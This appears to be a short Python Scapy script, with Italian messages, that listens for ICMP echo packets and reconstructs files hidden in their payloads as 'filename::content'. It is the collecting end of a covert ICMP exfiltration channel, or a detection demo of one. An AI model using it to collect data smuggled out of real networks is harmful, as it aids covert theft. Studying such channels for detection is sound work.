
from scapy.all import *

def process_packet(packet):
    
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:
        
        if packet.haslayer(Raw):
            try:
                data = packet[Raw].load.decode('utf-8', errors='ignore')
                
                if "::" in data:
                    filename, content = data.split("::", 1)
                    
                    print("\n" + "="*50)
                    print(f"[!!!] ESFILTRAZIONE RILEVATA DA: {packet[IP].src}")
                    print(f"[+] Nome File Rubato: {filename}")
                    print(f"[+] Contenuto del File:\n{content}")
                    print("="*50 + "\n")
                else:
                    print(f"[?] Dati Raw ricevuti: {data}")
                    
            except Exception as e:
                print(f"[-] Errore nel processare il pacchetto: {e}")

print("[*] In attesa di pacchetti ICMP con dati nascosti...")

sniff(iface="eth0", filter="icmp", prn=process_packet, store=0)